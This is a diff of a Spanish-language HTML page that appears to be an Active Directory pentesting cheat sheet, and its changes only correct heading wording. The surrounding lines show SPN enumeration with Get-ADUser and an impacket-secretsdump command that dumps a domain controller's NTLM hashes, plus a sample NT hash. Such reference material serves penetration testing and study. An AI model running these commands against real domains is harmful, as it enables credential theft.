@@ -43,9 +43,9 @@
               <pre><code>Get-ADUser -Filter {ServicePrincipalName -like &quot;*&quot;} -Properties ServicePrincipalName
 # Ejemplo: (MSSQLSvc/dc.custom.local) (CIFS/server.custom.local) (HTTP/web.custom.local)</code></pre>
             </section>
-            <h2>hash del SPN</h2>
+            <h2>Hash del SPN</h2>
             <section class="code-card">
-              <h3>Kali: Dumpear hashes del dominio para extrear hash del SPN</h3>
+              <h3>Kali: Volcar hashes del dominio para extraer el hash del SPN</h3>
               <pre><code>impacket-secretsdump &lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt; -just-dc-ntlm
 # hash NTLM SPN: hash NT -&gt; MSSQLSvc/dc.custom.local = 58A478135A93AC3BF058A5EA0E8FDB71</code></pre>
             </section>
